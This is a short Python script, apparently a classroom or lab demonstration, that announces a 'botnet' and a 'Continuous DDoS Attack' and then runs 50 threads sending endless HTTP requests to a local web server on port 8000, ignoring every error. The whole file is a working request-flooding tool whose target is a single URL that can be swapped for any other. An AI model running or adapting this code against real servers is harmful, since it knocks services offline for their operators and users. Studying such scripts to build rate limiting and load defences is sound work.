import urllib.request
import threading
import time

print("🚨 WARNING: Malicious Botnet Detected!")
print("--- PHASE 2: Executing Continuous DDoS Attack ---")
print("Flooding server... (Press Ctrl+C to stop the attack!)")

def spam_refresh():
    while True:
        try:
            urllib.request.urlopen("http://localhost:8000/")
        except:
            pass

threads = []
for i in range(50): 
    t = threading.Thread(target=spam_refresh)
    t.daemon = True 
    t.start()
    threads.append(t)

while True:
    time.sleep(1)